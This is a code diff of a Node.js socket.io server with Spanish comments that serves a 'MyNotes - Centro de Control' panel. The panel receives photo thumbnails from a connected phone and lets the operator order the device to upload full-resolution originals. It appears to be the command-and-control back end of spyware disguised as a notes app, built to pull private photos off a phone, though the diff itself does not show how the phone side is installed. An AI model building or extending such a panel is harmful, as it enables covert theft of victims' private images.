@@ -6,122 +6,81 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-// --- DISEÑO MEJORADO DEL PANEL ---
 app.get('/', (req, res) => {
     res.send(`
     <html>
         <head>
             <title>MyNotes - Centro de Control</title>
-            <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                /* Estilo oscuro moderno */
-                body { 
-                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-                    background-color: #121212; 
-                    color: #e0e0e0; 
-                    margin: 0; 
-                    padding: 20px; 
-                }
-                h1 { color: #bb86fc; text-align: center; margin-bottom: 10px; }
+                body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
+                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
+                .card { background: #1e1e1e; border-radius: 8px; overflow: hidden; text-align: center; border: 1px solid #333; }
+                .card img { width: 100%; height: 120px; object-fit: cover; opacity: 0.7; }
+                .card.hd img { opacity: 1; border-bottom: 2px solid #00ff00; } /* Estilo para fotos HD */
                 
-                /* Barra de estado */
-                #status { 
-                    text-align: center; 
-                    padding: 12px; 
-                    background: #1f1f1f; 
-                    border-radius: 8px; 
-                    margin-bottom: 25px;
-                    border: 1px solid #333;
-                    color: #03dac6;
-                    font-weight: bold;
-                }
-
-                /* Rejilla de fotos (Gallery Grid) */
-                .gallery { 
-                    display: grid; 
-                    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); 
-                    gap: 15px; 
-                }
-
-                /* Tarjeta de cada foto */
-                .card { 
-                    background: #1e1e1e; 
-                    border-radius: 10px; 
-                    overflow: hidden; 
-                    box-shadow: 0 4px 6px rgba(0,0,0,0.3); 
-                    transition: transform 0.2s;
-                    display: flex;
-                    flex-direction: column;
-                }
-                .card:hover { transform: translateY(-5px); border: 1px solid #bb86fc; }
-
-                /* Imagen */
-                img { 
-                    width: 100%; 
-                    height: 150px; 
-                    object-fit: cover; 
-                    cursor: pointer;
-                }
-
-                /* Información y Botón */
-                .info { padding: 10px; display: flex; flex-direction: column; gap: 8px; }
-                .name { font-size: 12px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+                /* BOTONES */
+                .btn-req { background: #ff9800; border: none; padding: 8px; width: 100%; cursor: pointer; color: white; font-weight: bold;}
+                .btn-req:hover { background: #f57c00; }
                 
-                /* BOTÓN DE DESCARGA */
-                .btn-download {
-                    background-color: #3700b3;
-                    color: white;
-                    text-decoration: none;
-                    padding: 8px;
-                    border-radius: 5px;
-                    text-align: center;
-                    font-size: 12px;
-                    font-weight: bold;
-                    transition: background 0.3s;
-                }
-                .btn-download:hover { background-color: #6200ee; }
+                .btn-down { background: #4CAF50; display: none; padding: 8px; width: 100%; color: white; text-decoration: none; font-weight: bold;}
+                
+                /* Cuando llega la HD, ocultamos el botón de pedir y mostramos descargar */
+                .card.hd .btn-req { display: none; }
+                .card.hd .btn-down { display: block; }
             </style>
         </head>
         <body>
-            <h1>📁 Galería MyNotes</h1>
-            <div id="status">⏳ Esperando conexión del dispositivo...</div>
-            <div class="gallery" id="photoGrid"></div>
+            <h1>📡 Panel de Control</h1>
+            <div id="status" style="padding: 10px; background: #333; margin-bottom: 20px;">Esperando conexión...</div>
+            <div class="grid" id="grid"></div>
 
             <script src="/socket.io/socket.io.js"></script>
             <script>
                 const socket = io();
-                const grid = document.getElementById('photoGrid');
-                const status = document.getElementById('status');
+                const grid = document.getElementById('grid');
 
-                // Aviso de conexión
-                socket.on('connection_alert', (msg) => {
-                    status.innerHTML = "🟢 " + msg;
-                    status.style.borderColor = '#03dac6';
-                });
+                socket.on('connection_alert', msg => document.getElementById('status').innerText = msg);
 
-                // Al recibir una foto nueva
-                socket.on('new_photo', (data) => {
-                    // Evitar duplicados (si la red falla y reenvía)
-                    if(document.getElementById(data.path)) return;
+                // 1. LLEGA MINIATURA (PREVIEW)
+                socket.on('new_preview', data => {
+                    if(document.getElementById(data.path)) return; // No repetir
 
                     const card = document.createElement('div');
                     card.className = 'card';
-                    card.id = data.path; // ID único para evitar repetidas
-                    
-                    // Convertir base64 a formato utilizable
-                    const imgSource = \`data:image/jpeg;base64,\${data.image64}\`;
-                    
+                    card.id = data.path; // Usamos la ruta como ID para encontrarla luego
                     card.innerHTML = \`
-                        <img src="\${imgSource}" onclick="window.open('\${imgSource}')" title="Ver grande">
-                        <div class="info">
-                            <div class="name">\${data.name}</div>
-                            <a href="\${imgSource}" download="\${data.name}" class="btn-download">⬇ Descargar</a>
-                        </div>
+                        <img src="data:image/jpeg;base64,\${data.image64}">
+                        <div style="font-size:10px; padding:5px;">\${data.name}</div>
+                        <button class="btn-req" onclick="pedirOriginal('\${data.path}')">⚡ PEDIR HD</button>
+                        <a id="link_\${data.path}" class="btn-down" download="\${data.name}">⬇ GUARDAR HD</a>
                     \`;
-                    
-                    // 'prepend' pone las fotos nuevas PRIMERO (arriba)
-                    grid.prepend(card); 
+                    grid.prepend(card);
                 });
+
+                // 2. LLEGA LA ORIGINAL (FULL IMAGE)
+                socket.on('receive_full', data => {
+                    // Buscamos la tarjeta original usando el nombre del archivo (truco simple)
+                    // Nota: En producción idealmente usamos IDs únicos, pero esto funcionará
+                    const cards = document.getElementsByClassName('card');
+                    for(let card of cards) {
+                        if(data.name.includes(card.innerText.trim())) {
+                            card.classList.add('hd'); // Cambia estilo a HD
+                            const img = card.querySelector('img');
+                            const link = card.querySelector('.btn-down');
+                            
+                            // Reemplazamos miniatura por HD
+                            img.src = "data:image/jpeg;base64," + data.image64;
+                            link.href = img.src; // Activamos botón descargar
+                            link.download = data.name;
+                        }
+                    }
+                });
+
+                function pedirOriginal(path) {
+                    // Enviamos la orden al servidor, el servidor se la pasa al celular
+                    socket.emit('order_download', { path: path });
+                    alert("Solicitud enviada... Espere unos segundos.");
+                }
             </script>
         </body>
     </html>
@@ -129,33 +88,28 @@ app.get('/', (req, res) => {
 });
 
 const server = http.createServer(app);
-
-// CONFIGURACIÓN DE ESTABILIDAD
-const io = new Server(server, {
-    cors: { origin: "*" },
-    allowEIO3: true,         // Vital para compatibilidad con Android
-    maxHttpBufferSize: 1e8,  // AUMENTADO A 100MB: Evita que se "corte" la conexión con fotos grandes
-    pingTimeout: 60000       // Esperar más tiempo antes de desconectar por mala red
-});
+const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });
 
 io.on('connection', (socket) => {
     console.log('🔗 Cliente conectado:', socket.id);
-    io.emit('connection_alert', `Dispositivo conectado (ID: ${socket.id.substring(0,5)})`);
+    io.emit('connection_alert', '✅ Dispositivo Conectado');
 
+    // REENVIAR DATOS DEL CELULAR A LA WEB
     socket.on('usrData', (data) => {
-        // Solo procesamos si es una imagen válida
-        if (data.dataType === 'images_list' && data.image64) {
-            io.emit('new_photo', data);
+        if (data.dataType === 'preview_image') {
+            io.emit('new_preview', data); // A todos los navegadores
+        } else if (data.dataType === 'full_image') {
+            console.log("📸 ¡Llegó una foto HD!");
+            io.emit('receive_full', data); // A todos los navegadores
         }
     });
 
-    socket.on('disconnect', () => {
-        console.log('❌ Cliente desconectado');
-        io.emit('connection_alert', '🔴 Dispositivo desconectado (Esperando...)');
+    // REENVIAR ORDEN DE LA WEB AL CELULAR
+    socket.on('order_download', (data) => {
+        console.log("Orden enviada al celular:", data.path);
+        // 'broadcast' envía a todos MENOS al que lo pidió (la web), o sea, al celular
+        socket.broadcast.emit('request_full_image', data);
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 Servidor Premium corriendo en puerto ${PORT}`);
-});
+server.listen(process.env.PORT || 3000, () => console.log('Servidor listo'));
